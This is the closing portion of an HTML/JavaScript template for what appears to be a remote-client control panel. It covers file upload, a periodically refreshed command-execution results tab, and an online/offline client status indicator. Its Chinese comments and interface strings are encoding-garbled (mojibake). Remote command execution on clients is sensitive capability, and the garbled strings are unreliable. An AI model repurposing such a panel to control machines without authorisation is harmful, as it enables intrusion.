                        fileInput.value = ''; // æ¸…ç©ºæ–‡ä»¶è¾“å…¥
                        document.getElementById('fileNameDisplay').textContent = 'æœªé€‰æ‹©ä»»ä½•æ–‡ä»¶';
                        listDirectory(); // åˆ·æ–°æ–‡ä»¶åˆ—è¡¨
                    } else {
                        alert(`ä¸Šä¼ å¤±è´¥: ${result.message}`);
                    }
                } else {
                    const errorText = await response.text();
                    try {
                        const error = JSON.parse(errorText);
                        alert(`ä¸Šä¼ å¤±è´¥: ${error.message || 'Unknown error'}`);
                    } catch (e) {
                        alert(`ä¸Šä¼ å¤±è´¥: HTTP ${response.status}`);
                    }
                }
            } catch (error) {
                alert('ä¸Šä¼ æ—¶å‡ºé”™: ' + error.message);
            }
        }

        // è‡ªåŠ¨åˆ·æ–°ç»“æœï¼ˆåªåœ¨å‘½ä»¤æ‰§è¡Œæ ‡ç­¾é¡µæ¿€æ´»æ—¶ï¼‰
        setInterval(() => {
            if (document.querySelector('.tab-item[data-tab="command"]').classList.contains('active')) {
                refreshResults();
            }
        }, 15000);

        // åŠ¨æ€æ›´æ–°å®¢æˆ·ç«¯çŠ¶æ€
        function updateClientStatus() {
            const lastSeen = new Date('{{ client.last_seen.format("%Y-%m-%dT%H:%M:%SZ") }}');
            const now = new Date();
            const diffInSeconds = (now - lastSeen) / 1000;
            
            const statusElement = document.getElementById('client-status');
            if (diffInSeconds < 60) {
                statusElement.innerHTML = '<span class="status online">åœ¨çº¿</span>';
            } else {
                statusElement.innerHTML = '<span class="status offline">ç¦»çº¿</span>';
            }
        }

        // é¡µé¢åŠ è½½æ—¶æ›´æ–°çŠ¶æ€
        updateClientStatus();

        // æ›´æ–°æ–‡ä»¶åç§°æ˜¾ç¤º
        function updateFileName(input) {
            const fileNameDisplay = document.getElementById('fileNameDisplay');
            if (input.files && input.files.length > 0) {
                fileNameDisplay.textContent = input.files[0].name;
            } else {
                fileNameDisplay.textContent = 'æœªé€‰æ‹©ä»»ä½•æ–‡ä»¶';
            }
        }
    </script>
</body>
</html>
